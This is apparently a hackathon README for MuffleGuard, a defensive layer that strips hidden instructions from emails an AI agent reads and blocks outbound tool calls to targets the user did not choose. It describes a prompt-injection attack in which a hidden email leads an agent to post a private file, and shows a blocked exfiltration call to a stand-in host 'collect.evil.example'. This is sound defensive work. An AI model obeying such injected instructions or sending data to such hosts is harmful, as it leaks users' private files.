# MuffleGuard

A guard that sits between an AI agent and its tools. It muffles instructions
hidden in the content the agent reads, and refuses any action whose target was
chosen by that content rather than by the user.

Built for TatHack '26, Track 2 (Safe & Trustworthy AI).

> Your AI agent can read the attacker's email. MuffleGuard makes sure it can't obey it.

## The problem

An agent that reads email and can send it has everything an attacker needs: it
reads text the attacker wrote, it holds data worth stealing, and it can send
things out. An instruction hidden in an email is read by the model exactly like
one from the user.

## How it works

Two layers, so that one miss is not a breach.

**Detect and muffle.** Hidden carriers (invisible Unicode, white-on-white CSS,
HTML comments, base64) are decoded and removed, and two small CPU classifiers
flag sentences addressed to the model rather than to the user. Only those
sentences are removed, so the rest of the email still reaches the agent.

**Data-flow policy.** Before any outbound tool call runs, every target is traced
back to where it came from. One invariant decides it:

> An outbound tool call may only act on a target the user chose,
> unless a human approves it.

No model is consulted, so there is nothing to argue out of it. A target found
only in an email is refused and the refusal names the email. A target found
nowhere goes to a human. Separately, a payload carrying secrets or quoting a
private file never leaves.

Every decision is written to a hash-chained SQLite log, so an edit after the
fact breaks the chain at that entry.

## Try it

```bash
python -m venv .venv && .venv/Scripts/python -m pip install -r requirements-dev.txt onnxruntime tokenizers numpy
cp .env.example .env            # add an OpenAI-compatible key
.venv/Scripts/python -m pytest  # 89 tests, no network needed
.venv/Scripts/python tools/hero_attack.py --no-muffle
```

`hero_attack.py` runs the same request twice. Undefended, the agent obeys an
email that nobody can see and posts a private file to the attacker. Defended
with every content defence switched off, the model still obeys, and the policy
engine refuses the call:

```
BLOCK http_post(url='https://collect.evil.example/u', ...)
      The url 'collect.evil.example' came from email #5 from hr@corp.example, not from you.
```

## What is not claimed

- The audit log is tamper-**evident**, not tamper-proof: anyone who can write
  the file can recompute the chain. That needs a signing key the writer does not
  hold.
- A redirect through a host the user named is not caught; the host is theirs, so
  provenance is satisfied.
- An address the user pastes into their own request is trusted, because they
  chose it.
- Detection thresholds are not yet tuned: "please ignore my last email" is
  currently flagged. Measured on held-out data in the next phase.

Both known gaps are asserted as they behave in `tests/test_redteam.py`.

## Credits

| What | Licence |
| --- | --- |
| [protectai/deberta-v3-base-prompt-injection-v2](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2) | Apache-2.0 |
| [Horizon-Labs/prompt-injection-guard-small](https://huggingface.co/Horizon-Labs/prompt-injection-guard-small) | Apache-2.0 |
| [onnxruntime](https://onnxruntime.ai/), [tokenizers](https://github.com/huggingface/tokenizers), [numpy](https://numpy.org/) | MIT / Apache-2.0 / BSD-3 |
| [FastAPI](https://fastapi.tiangolo.com/), [httpx](https://www.python-httpx.org/), [uvicorn](https://www.uvicorn.org/) | MIT / BSD-3 |
| [pytest](https://pytest.org/), [Hypothesis](https://hypothesis.works/) | MIT / MPL-2.0 |
| Agent model via [OpenRouter](https://openrouter.ai/) | provider terms |

The Verhoeff and Luhn checksums are implemented from their published
definitions. The sandbox inbox, files and attacks are written by us; no real
account or personal data is used anywhere.

## AI usage

Developed with Claude Code (Claude Opus) used for pair programming: design
discussion, drafting modules and tests, and adversarial review. Every design
decision, the security model and the threat model are the team's own, and each
member can explain the code they own. The demo video is recorded by a person.

## Team

- Mohith Akshay Duggirala — [@Trafalgar-2006](https://github.com/Trafalgar-2006)
- [@samdoglover](https://github.com/samdoglover)

Licensed under Apache-2.0.
